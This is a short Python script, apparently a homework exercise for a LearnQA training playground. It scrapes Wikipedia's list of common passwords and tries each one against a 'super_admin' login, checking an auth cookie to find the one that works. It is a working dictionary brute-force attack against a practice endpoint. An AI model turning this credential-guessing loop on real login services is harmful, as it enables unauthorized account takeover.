import requests
from bs4 import BeautifulSoup as bs

URL_TEMPLATE = "https://en.wikipedia.org/wiki/List_of_the_most_common_passwords"
r = requests.get(URL_TEMPLATE)
soup = bs(r.text, "html.parser")

vacancies_names = soup.find_all('table', class_='wikitable')[1]
list = []
for i in vacancies_names.find_all('td'):
    list.append(i.text)
passwords1 = []
for i in list:
    if len(i)>4:
        a = i.replace('\n', '')
        passwords1.append(a)
passwords = []
for i in passwords1:
    if i not in passwords:
        passwords.append(i)

URL = 'https://playground.learnqa.ru/ajax/api/get_secret_password_homework'
login = 'super_admin'

URL2 = 'https://playground.learnqa.ru/ajax/api/check_auth_cookie'

for i in passwords:
    response = requests.post(URL, data={"login": login, "password": i})
    cookies_value = response.cookies.get('auth_cookie')
    cookies = {'auth_cookie': cookies_value}
    response1 = requests.post(URL2, cookies=cookies)
    if response1.text != 'You are NOT authorized':
        print(f'Пароль - {i} : {response1.text}')